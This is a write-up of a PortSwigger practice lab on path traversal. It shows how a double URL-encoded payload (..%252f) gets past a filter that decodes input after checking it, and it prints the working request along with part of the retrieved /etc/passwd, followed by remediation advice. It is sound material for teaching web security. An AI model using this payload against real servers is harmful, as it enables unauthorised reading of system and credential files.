# File path traversal, traversal sequences stripped with superfluous URL-decode

**Category:** Path traversal
**Level:** Practitioner
**Mechanism:** Double URL-encoding bypass (`%252f` → `%2f` → `/`)
**Lab URL:** https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

---

## Vulnerability

Path traversal in the product-image endpoint. The defence blocks input containing
traversal sequences, but then performs an **extra** URL-decode on the input *after* the
block check. That superfluous decode lets a double-encoded sequence slip past the
filter as harmless-looking text and turn back into `../` only after the check has
passed.

## Reconnaissance & Exploitation

Images load via `GET /image?filename=<name>`. I walked up the filter one layer at a
time, reading each error:

```
filename=/etc/passwd                 → 400 "No such file"   (absolute path blocked/invalid)
filename=../../../....//etc/passwd    → 400 "No such file"   (raw ../ blocked)
filename=%2e%2e%2f...%2fetc/passwd    → 400 "No such file"   (single-encoded ../ still blocked)
```

Single URL-encoding (`%2e%2e%2f`) failed because the app decodes it once *before* the
block check, so the filter still sees `../`. The bypass is to encode **twice**: encode
each character of `%2f` again, giving `%252f` (`%25` = `%`). Walking the layers:

```
%252f   → first decode →  %2f   → second (superfluous) decode →  /
```

The filter checks the input while it is still `%252f` (no `../` visible → passes), and
only the later extra decode turns it into the real `/`. Sending the fully
double-encoded path:

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
Host: 0ae5009d03940b1d817c1b7f0095000b.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
...
```

Lab solved — `/etc/passwd` retrieved. The flaw is decoding input **after** validating
it: the string the filter inspects is not the string the filesystem ultimately receives.

## Impact

Arbitrary file read with the web process's privileges — account enumeration via
`/etc/passwd`, and access to source, config, secrets and keys. The specific lesson:
validating input and then transforming it (an extra decode) reopens the hole, because
the check and the use operate on different representations of the same value.

## Remediation

- Canonicalise fully **first**, then validate, then use — never decode after the
  security check. Decode once, resolve the real path (`realpath`), and confirm it stays
  inside the intended base directory.
- Reject, don't sanitise: block the request outright if the canonical path escapes the
  base, rather than trying to clean the input.
- Best: don't build filesystem paths from user input; map an opaque ID to a known file.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory); CWE-172 (Encoding Error)

## Notes

- Core idea = check/use mismatch across decode layers. The filter sees `%252f`
  (harmless); the filesystem sees `/` (after the extra decode). Same two-layer trick as
  SSPP, just with URL-decoding instead of a front-end→internal hop.
- Layer ladder worth remembering: `/` → `%2f` (one encode) → `%252f` (two encodes). Add
  an encoding layer for every superfluous decode the app does.
- Burp's Inspector "Decoded from" panel confirms what each layer collapses to — useful
  to verify the payload before sending.